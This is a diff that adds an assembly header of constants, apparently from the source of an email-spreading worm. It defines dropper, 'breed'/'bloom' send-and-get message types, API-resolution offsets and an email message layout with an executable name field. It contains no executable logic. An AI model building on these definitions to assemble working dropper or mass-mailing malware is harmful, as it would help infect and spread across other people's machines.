@@ -1,0 +1,49 @@
+MT_PROCESSDROPPER EQU 00000001b
+MT_BLOCKIP        EQU 00000010b
+MT_APP            EQU 00000100b
+MT_GENTEXT        EQU 00001000b
+MT_QUERY          EQU 00010000b
+MT_BREED          EQU 00100000b         ;send
+MT_BLOOM          EQU 01000000b         ;get
+
+MS_SENT           EQU 010000000000000000000000000000000b
+
+MR_OK      EQU 00000001b
+MR_SEH     EQU 00000010b
+MR_SKIPSEH EQU 00000100b
+MR_ERROR   EQU 00001000b
+MR_DONE    EQU 00010000b
+MR_DELETE  EQU 01000000b
+MR_INVALID EQU 10000000b
+
+m_why         EQU 0
+m_result      EQU 0
+
+m_dropper     EQU 4
+m_buffer      EQU 4
+m_ip          EQU 4
+m_kind        EQU 4
+m_muazzin     EQU 4
+
+m_version     EQU 8
+m_droppersize EQU 8
+m_port        EQU 8
+m_iroutine    EQU 8
+
+GMH           EQU 12
+
+GPA           EQU 16
+
+size_muazzin_struc EQU 20
+
+menum_kind        EQU 0
+menum_type        EQU 4
+menum_version     EQU 8
+
+menum_sizeof      EQU 12
+
+mtext_bodymsg     EQU 00*1024
+mtext_boundary    EQU 29*1024
+mtext_headers     EQU 30*1024
+mtext_exename     EQU 62*1024
+
